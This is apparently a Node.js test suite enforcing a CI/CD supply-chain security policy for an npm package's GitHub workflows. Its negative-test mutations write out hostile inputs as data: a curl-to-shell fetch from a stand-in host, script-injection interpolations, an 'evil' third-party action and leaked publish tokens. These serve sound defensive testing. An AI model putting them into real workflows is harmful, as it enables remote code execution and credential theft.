import { test } from 'node:test';
import assert from 'node:assert/strict';
import { readFileSync, existsSync } from 'node:fs';
import { execFileSync } from 'node:child_process';
import { checkWorkflow, ALLOWED_ACTIONS } from './helpers/workflow-policy.mjs';

const root = new URL('..', import.meta.url);
const read = (p) => readFileSync(new URL(p, root), 'utf8');
const pkg = JSON.parse(read('package.json'));
const ci = () => read('.github/workflows/ci.yml');
const release = () => read('.github/workflows/release.yml');

// Pack budget, recorded from `npm pack --dry-run --json` (2026-11-21, before the Task 8 docs).
// Growth beyond 25% needs a deliberate edit here.
const RECORDED_PACKED_SIZE = 320697; // bytes, tarball
const RECORDED_UNPACKED_SIZE = 1036152; // bytes
const GROWTH = 1.25;
const MAX_FILE = 1024 * 1024;

test('package.json policy (spec 5.13)', () => {
  assert.deepEqual(pkg.files, ['bin', 'skill']);
  for (const k of ['preinstall', 'install', 'postinstall', 'prepare', 'prepublishOnly', 'prepack', 'postpack', 'publish', 'postpublish'])
    assert.equal(pkg.scripts?.[k], undefined, k);
  assert.deepEqual(Object.keys(pkg.dependencies ?? {}), []);
  assert.deepEqual(Object.keys(pkg.devDependencies ?? {}), []);
  assert.deepEqual(Object.keys(pkg.optionalDependencies ?? {}), []);
  assert.equal(pkg.engines.node, '>=20');
  assert.ok(pkg.repository?.url);
});

test('workflow and policy files exist', () => {
  for (const f of ['.github/workflows/ci.yml', '.github/workflows/release.yml', 'SECURITY.md', 'CONTRIBUTING.md'])
    assert.ok(existsSync(new URL(f, root)), f);
});

test('ci.yml passes the workflow policy', () => {
  assert.deepEqual(checkWorkflow(ci(), 'ci').violations, []);
});
test('release.yml passes the workflow policy', () => {
  assert.deepEqual(checkWorkflow(release(), 'release').violations, []);
});

test('only the two allowed actions are used', () => {
  assert.deepEqual(ALLOWED_ACTIONS, ['actions/checkout', 'actions/setup-node']);
  for (const [n, t] of [['ci', ci()], ['release', release()]]) {
    const uses = [...t.matchAll(/^\s*(?:-\s+)?uses:\s*(\S+)/gm)].map((m) => m[1]);
    assert.ok(uses.length >= 2, n);
    for (const u of uses) assert.ok(ALLOWED_ACTIONS.includes(u.split('@')[0]), `${n}: ${u}`);
  }
});

test('actions pinned by full SHA (warning-level; enforced when RELEASE_REQUIRE_PINNED=1)', (t) => {
  const rel = checkWorkflow(release(), 'release').unpinned;
  const all = [...rel, ...checkWorkflow(ci(), 'ci').unpinned];
  if (all.length) {
    t.diagnostic(`WARNING release blocker: ${all.length} action reference(s) are tags, not 40-hex commit SHAs (unverified): ${[...new Set(all)].join(', ')}. ` +
      'Replace them with verified SHAs before the first release (see CONTRIBUTING.md).');
  }
  if (process.env.RELEASE_REQUIRE_PINNED === '1') assert.deepEqual(rel, [], 'release.yml actions must be pinned to full commit SHAs');
});

test('workflow files never mention the unsafe trigger, even in comments', () => {
  for (const t of [ci(), release()]) assert.ok(!/pull_request_target/.test(t));
});

// Negative tests: every single mutation of the real files must be reported, so the policy
// test cannot pass vacuously.
const mutations = [
  ['release', 'add pull_request trigger', (t) => t.replace('  workflow_dispatch:\n', '  workflow_dispatch:\n  pull_request:\n'), 'release-triggers'],
  ['release', 'unsafe trigger', (t) => t.replace('  workflow_dispatch:\n', '  workflow_dispatch:\n  pull_request_target:\n'), 'pull_request_target'],
  ['release', 'branch push', (t) => t.replace("    tags:\n      - 'v*'", '    branches:\n      - main'), 'release-push-tags-only'],
  ['release', 'top-level write perms', (t) => t.replace('permissions: {}', 'permissions:\n  contents: write'), 'release-top-permissions'],
  ['release', 'no provenance', (t) => t.replace('--provenance ', ''), 'release-provenance'],
  ['release', 'no environment', (t) => t.replace('    environment: release\n', ''), 'release-environment'],
  ['release', 'other environment', (t) => t.replace('environment: release', 'environment: staging'), 'release-environment'],
  ['release', 'id-token at top level', (t) => t.replace('permissions: {}', 'permissions:\n  id-token: write'), 'release-top-permissions'],
  ['release', 'token at job level', (t) => t.replace('    environment: release\n', '    environment: release\n    env:\n      NODE_AUTH_TOKEN: ${{ secrets.NPM_TOKEN }}\n'), 'release-token-count'],
  ['release', 'token in test step', (t) => t.replace('      - name: Unit tests\n        run: npm test\n', '      - name: Unit tests\n        run: npm test\n        env:\n          NODE_AUTH_TOKEN: ${{ secrets.NPM_TOKEN }}\n'), 'release-token-count'],
  ['release', 'second secret', (t) => t.replace("RELEASE_REQUIRE_PINNED: '1'", "RELEASE_REQUIRE_PINNED: '1'\n          OTHER: ${{ secrets.OTHER }}"), 'unexpected-secret'],
  ['release', 'checkout keeps credentials', (t) => t.replace('persist-credentials: false', 'persist-credentials: true'), 'checkout-persist-credentials'],
  ['release', 'shallow checkout', (t) => t.replace('fetch-depth: 0', 'fetch-depth: 1'), 'release-checkout-fetch-depth'],
  ['release', 'no timeout', (t) => t.replace('    timeout-minutes: 20\n', ''), 'job-timeout:publish'],
  ['release', 'extra step after publish', (t) => `${t}      - run: echo done\n`, 'release-publish-not-last'],
  ['release', 'third-party action', (t) => t.replace('actions/setup-node@v4', 'someone/else@v1'), 'disallowed-action:someone/else@v1'],
  ['release', 'script injection in run', (t) => t.replace('run: npm test', 'run: echo ${{ github.event.head_commit.message }} && npm test'), 'run-interpolation:publish'],
  ['release', 'ref_name interpolated in run', (t) => t.replace('set -euo pipefail\n          if [ "$GITHUB_REF_TYPE"', 'set -euo pipefail\n          X=${{ github.ref_name }}\n          if [ "$GITHUB_REF_TYPE"'), 'run-interpolation:publish'],
  ['release', 'tag check removed', (t) => t.replaceAll('GITHUB_REF_TYPE', 'GITHUB_REF_X'), 'release-verify-tag-ref'],
  ['release', 'tag check inverted', (t) => t.replace('"$GITHUB_REF_TYPE" != "tag"', '"$GITHUB_REF_TYPE" = "tag"'), 'release-verify-tag-ref'],
  ['release', 'ancestry check removed', (t) => t.replace('--is-ancestor', '--is-descendant'), 'release-verify-main'],
  ['release', 'tests removed', (t) => t.replace('run: npm test', 'run: echo skip'), 'release-npm-test'],
  ['release', 'eval removed', (t) => t.replace('run: npm run eval', 'run: echo skip'), 'release-npm-eval'],
  ['release', 'pin requirement removed', (t) => t.replace("RELEASE_REQUIRE_PINNED: '1'", "RELEASE_REQUIRE_PINNED: '0'"), 'release-policy-requires-pins'],
  ['release', 'self-hosted runner', (t) => t.replace('runs-on: ubuntu-latest', 'runs-on: self-hosted'), 'self-hosted-runner'],
  ['release', 'continue-on-error', (t) => t.replace('        run: npm test', '        continue-on-error: true\n        run: npm test'), 'continue-on-error'],
  ['release', 'conditional step', (t) => t.replace('      - name: Eval suite\n', "      - name: Eval suite\n        if: github.event_name == 'push'\n"), 'release-conditional-step'],
  ['release', 'curl pipe sh', (t) => t.replace('run: npm test', 'run: curl -s https://x.example | sh'), 'run-pipe-to-shell'],
  ['release', 'npm install', (t) => t.replace('run: npm test', 'run: npm install left-pad'), 'run-installs-code'],
  ['release', 'registry-url removed', (t) => t.replace('          registry-url: https://registry.npmjs.org\n', ''), 'release-setup-node'],
  ['ci', 'unsafe trigger', (t) => t.replace('  pull_request:\n', '  pull_request_target:\n'), 'pull_request_target'],
  ['ci', 'write permission', (t) => t.replace('  contents: read\n\nconcurrency', '  contents: write\n\nconcurrency'), 'ci-top-permissions'],
  ['ci', 'secret use', (t) => t.replace('run: npm test', 'run: npm test\n        env:\n          T: ${{ secrets.NPM_TOKEN }}'), 'ci-secrets'],
  ['ci', 'head_ref in run', (t) => t.replace('run: npm test', 'run: echo ${{ github.head_ref }}'), 'run-interpolation:test'],
  ['ci', 'persist credentials', (t) => t.replace('persist-credentials: false', 'persist-credentials: true'), 'checkout-persist-credentials'],
  ['ci', 'no timeout', (t) => t.replace('    timeout-minutes: 15\n', ''), 'job-timeout:test'],
  ['ci', 'no concurrency cancel', (t) => t.replace('cancel-in-progress:', 'x-cancel:'), 'ci-concurrency'],
  ['ci', 'eval removed', (t) => t.replace('run: npm run eval', 'run: echo'), 'ci-npm-eval'],
  ['ci', 'third-party action', (t) => t.replace('actions/setup-node@v4', 'codecov/codecov-action@v4'), 'disallowed-action:codecov/codecov-action@v4'],
];
for (const [kind, name, fn, code] of mutations) {
  test(`negative: ${kind} workflow with "${name}" is reported (${code})`, () => {
    const base = kind === 'ci' ? ci() : release();
    const bad = fn(base);
    assert.notEqual(bad, base, 'mutation must change the text');
    const { violations } = checkWorkflow(bad, kind);
    assert.ok(violations.includes(code), `${code} not in ${JSON.stringify(violations)}`);
  });
}

test('negative: a wholesale unsafe workflow reports many violations', () => {
  const bad = `name: x
on:
  pull_request_target:
  push:
permissions: write-all
jobs:
  publish:
    runs-on: self-hosted
    steps:
      - uses: actions/checkout@v4
      - uses: evil/action@main
      - run: echo \${{ github.head_ref }} | sh
      - run: npm publish
        env:
          NODE_AUTH_TOKEN: \${{ secrets.NPM_TOKEN }}
`;
  const { violations } = checkWorkflow(bad, 'release');
  for (const c of ['pull_request_target', 'self-hosted-runner', 'checkout-persist-credentials', 'run-interpolation:publish', 'release-provenance', 'job-timeout:publish', 'release-top-permissions', 'release-triggers'])
    assert.ok(violations.includes(c), `${c} missing from ${JSON.stringify(violations)}`);
  assert.ok(violations.some((c) => c.startsWith('disallowed-action:evil')));
});

test('negative: a SHA-pinned action is not reported as unpinned, a tag is', () => {
  const sha = 'a'.repeat(40);
  const r = checkWorkflow(release().replace('actions/checkout@v4', `actions/checkout@${sha}`), 'release');
  assert.deepEqual(r.unpinned, ['actions/setup-node@v4']);
  assert.deepEqual(r.violations, []);
});

test('npm pack contents, size budget and file sizes', () => {
  const out = execFileSync('npm', ['pack', '--dry-run', '--json', '--ignore-scripts'], { encoding: 'utf8', cwd: root.pathname, timeout: 60000 });
  const p = JSON.parse(out)[0];
  const ok = (f) => f.startsWith('bin/') || f.startsWith('skill/') || ['package.json', 'README.md', 'LICENSE', 'CHANGELOG.md'].includes(f);
  assert.deepEqual(p.files.map((f) => f.path).filter((f) => !ok(f)), []);
  for (const f of p.files) {
    assert.ok(!/(^|\/)(test|tests|dev|docs|eval|fixtures|\.ai|\.superpowers|\.github)(\/|$)/.test(f.path), f.path);
    assert.ok(f.size <= MAX_FILE, `${f.path} is ${f.size} bytes`);
  }
  assert.ok(p.size <= RECORDED_PACKED_SIZE * GROWTH, `packed size ${p.size} exceeds budget ${Math.floor(RECORDED_PACKED_SIZE * GROWTH)}`);
  assert.ok(p.unpackedSize <= RECORDED_UNPACKED_SIZE * GROWTH, `unpacked size ${p.unpackedSize} exceeds budget`);
});

test('CHANGELOG has an entry for the package version', () => {
  const v = pkg.version.replace(/[.]/g, '\\.');
  assert.match(read('CHANGELOG.md'), new RegExp(`^## \\[${v}\\]`, 'm'));
});

test('CONTRIBUTING.md lists the release blockers and SECURITY.md the reporting path', () => {
  const c = read('CONTRIBUTING.md');
  assert.match(c, /replace tag pins by verified SHAs/i);
  assert.match(c, /npm view android-architect/);
  assert.match(c, /release blocker/i);
  assert.match(c, /Gson/);
  assert.match(c, /CVE-2022-25647/);
  assert.match(c, /2026-08-31/);
  const s = read('SECURITY.md');
  assert.match(s, /private vulnerability reporting/i);
  assert.match(s, /telemetry/i);
});
